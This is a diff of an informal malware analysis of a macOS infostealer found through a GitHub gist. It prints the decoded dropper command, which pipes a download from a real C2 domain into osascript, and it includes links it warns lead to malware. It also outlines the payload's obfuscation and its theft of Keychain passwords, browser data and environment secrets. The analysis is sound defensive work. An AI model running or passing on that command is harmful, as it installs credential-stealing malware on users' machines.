@@ -4,11 +4,15 @@ All found by me :3
 
 &nbsp;
 
-&nbsp;
+## do NOT under ANY circumstance, click any of the links on this page. they link to MALWARE.
+
+## unless I mention otherwise.
 
 &nbsp;
 
-&nbsp;
+I found this malware through a link on a github issue, linked here: https://gist.github.com/guidedefa/24db2e7a4ec07a6086b46e83da42e323
+
+posted by the user: https://gist.github.com/dimeniece
 
 it was basically straight forward since theyre STUPID asf.
 
@@ -40,8 +44,6 @@ echo 'Y3VybCAtc2ZMIGh0dHBzOi8vc2FuZGJveG1vbml0b3IucHJvL2Ntd2Y4bC82NEwwUFNiYTA3bk
 Decoded too:  
 curl -sfL [https://sandboxmonitor.pro/cmwf8l/64L0PSba07nG](https://sandboxmonitor.pro/cmwf8l/64L0PSba07nG) | osascript -l JavaScript
 
-&nbsp;
-
 The c2 payload was at sandboxmonitor.pro/cmwf8l/64L0PSba07nG  
 About 136,713 bytes
 
@@ -55,11 +57,9 @@ Obfuscation of:
 Hex method name splitting, '\\\\x66r'+'om'+'Ch'+'arCo'+'de' > fromCharCode  
 Arithmetic expressions as char codes, (372-236), (187^132), (-578+691)  
 XOR-keyed char arrays, \[n1,n2,...\].map((x,i) => chr(((x-sub+256)&0xFF)^xor)).join("")  
-RC4 stream cipher, 3 large encrypted byte arrays decrypted at runtime using a hardware derived key
+RC4 stream cipher, 3 large encrypted byte arrays decrypted at runtime using a hardware derived key 
 
-&nbsp;
-
-Payload behaviour:
+## Payload behaviour:
 
 Imported framework of:  
 Cocoa, for UI, dialogs, file access  
@@ -120,8 +120,10 @@ The key is hardware derived, different on every machine, prevents static decrypt
 
 &nbsp;
 
-What it does!  
-This is a behavioral analysis of func names and api calls  
+## What it does!
+
+This is a behavioral analysis of func names and api calls
+
 (Basing off decoded func names api strings and patterns)  
 stopGatekeeperPolicy = Bypasses/checks Gatekeeper  
 parseCacheConnection = Reads browser profile directories  
@@ -135,7 +137,10 @@ determineKernelParameters = Gets OS version, SIP state
 applyKernelStatus = FINAL EXFIL sends data to C2  
 resetAgentPolicy Keychain API: SecKeychainFindGenericPassword
 
-Targeted data:  
+## targeted data:
+
+&nbsp;
+
 Keychain SecKeychainFindGenericPassword  
 (All ur saved passwords
 
@@ -155,9 +160,7 @@ NSProcessInfo
 Environment variables (AWS keys, tokens, etc )
 
 NSDate  
-Timing/beacon
-
-&nbsp;
+Timing/beacon 
 
 The main payload sits in the RC4-encrypted upgradePlatformDescriptor array ( 3,396 bytes )  
 Which.. requires a live victim machine to decrypt
